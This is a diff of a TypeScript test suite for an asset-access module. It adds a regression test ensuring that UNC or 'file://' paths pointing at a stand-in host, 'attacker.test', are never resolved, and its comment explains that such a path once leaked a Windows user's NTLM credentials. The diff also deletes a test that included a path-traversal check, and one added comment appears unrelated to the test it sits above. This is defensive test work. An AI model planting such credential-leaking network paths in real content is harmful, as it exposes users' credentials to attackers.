@@ -18,6 +18,7 @@ import * as FileSystem from "effect/FileSystem";
 import * as Layer from "effect/Layer";
 import * as Redacted from "effect/Redacted";
 import * as Path from "effect/Path";
+import * as PlatformError from "effect/PlatformError";
 import * as Schema from "effect/Schema";
 import { HttpClient, HttpClientResponse, HttpServerResponse } from "effect/http";
 import { vi } from "vite-plus/test";
@@ -170,6 +171,7 @@ describe("AssetAccess", () => {
       }).pipe(Effect.provide(NodeServices.layer)),
     );
 
+    // regression: #17026 apply host color scheme to saved MCP apps
     it.effect("preserves filesystem failures instead of reporting oversized HTML", () =>
       Effect.gen(function* () {
         const fileSystem = yield* FileSystem.FileSystem;
@@ -262,6 +264,7 @@ describe("AssetAccess", () => {
   it.live("resolves every concurrent first mint, whichever process signed it", () =>
     Effect.gen(function* () {
       const fileSystem = yield* FileSystem.FileSystem;
+      // oxlint-disable-next-line lecturn/no-real-time-wait-in-tests -- real pauses so concurrent mints overlap on the real filesystem.
       const realDelay = (ms: number) => Effect.sleep(Duration.millis(ms));
       // Slow secret writes keep a just-created key file around long enough for
       // other mints to read it; each `make` stands in for a separate process.
@@ -409,6 +412,47 @@ describe("AssetAccess", () => {
           }
         }
       }).pipe(Effect.provideService(HostProcess.HomeDirectory, home));
+    }).pipe(Effect.provide(layerTest)),
+  );
+
+  // Resolving `file://attacker.test/share/cat.jpg` from an agent's markdown sent the
+  // Windows user's NTLM credentials to attacker.test.
+  it.effect("never resolves a network media path outside the thread's project", () =>
+    Effect.gen(function* () {
+      const fs = yield* FileSystem.FileSystem;
+      const path = yield* Path.Path;
+      const resolved: Array<string> = [];
+      const recordingFileSystem = FileSystem.FileSystem.of({
+        ...fs,
+        realPath: (requestedPath) => {
+          resolved.push(requestedPath);
+          return Effect.fail(
+            PlatformError.systemError({
+              _tag: "NotFound",
+              module: "FileSystem",
+              method: "realPath",
+              pathOrDescriptor: requestedPath,
+            }),
+          );
+        },
+      });
+      const share = "//nas.test/share/project";
+      for (const resource of [
+        {
+          _tag: "media-file",
+          threadId: ThreadId.make("thread-1"),
+          path: "//attacker.test/s/a.png",
+        },
+        { _tag: "draft-workspace-file", cwd: share, path: "//attacker.test/s/a.png" },
+        { _tag: "media-file", threadId: ThreadId.make("thread-1"), path: `${share}/a.png` },
+      ] as const) {
+        const error = yield* issueAssetUrl({ resource, workspaceRoot: share }).pipe(
+          Effect.provideService(FileSystem.FileSystem, recordingFileSystem),
+          Effect.flip,
+        );
+        expect(error._tag).toBe("AssetWorkspaceAssetNotFoundError");
+      }
+      expect(resolved).toEqual([path.resolve(`${share}/a.png`)]);
     }).pipe(Effect.provide(layerTest)),
   );
 
@@ -735,40 +779,6 @@ describe("AssetAccess", () => {
         },
       });
       expect(error.cause).toBeInstanceOf(WorkspacePaths.WorkspacePathOutsideRootError);
-    }).pipe(Effect.provide(layerTest)),
-  );
-
-  it.effect("issues draft workspace URLs without a thread", () =>
-    Effect.gen(function* () {
-      const fileSystem = yield* FileSystem.FileSystem;
-      const path = yield* Path.Path;
-      const root = yield* fileSystem.makeTempDirectoryScoped({
-        prefix: "lecturn-asset-draft-",
-      });
-      const htmlPath = path.join(root, "report.html");
-      const cssPath = path.join(root, "report.css");
-      yield* fileSystem.writeFileString(htmlPath, '<link rel="stylesheet" href="report.css">');
-      yield* fileSystem.writeFileString(cssPath, "body { color: red; }");
-      const canonicalHtmlPath = yield* fileSystem.realPath(htmlPath);
-      const canonicalCssPath = yield* fileSystem.realPath(cssPath);
-
-      const result = yield* issueAssetUrl({
-        resource: { _tag: "draft-workspace-file", cwd: root, path: "report.html" },
-        workspaceRoot: root,
-      });
-      const suffix = result.relativeUrl.slice(`${ASSET_ROUTE_PREFIX}/`.length);
-      const separatorIndex = suffix.indexOf("/");
-      const token = suffix.slice(0, separatorIndex);
-
-      expect(yield* resolveAsset(token, "report.html")).toEqual({
-        kind: "file",
-        path: canonicalHtmlPath,
-      });
-      expect(yield* resolveAsset(token, "report.css")).toEqual({
-        kind: "file",
-        path: canonicalCssPath,
-      });
-      expect(yield* resolveAsset(token, "../secret.txt")).toBeNull();
     }).pipe(Effect.provide(layerTest)),
   );
 
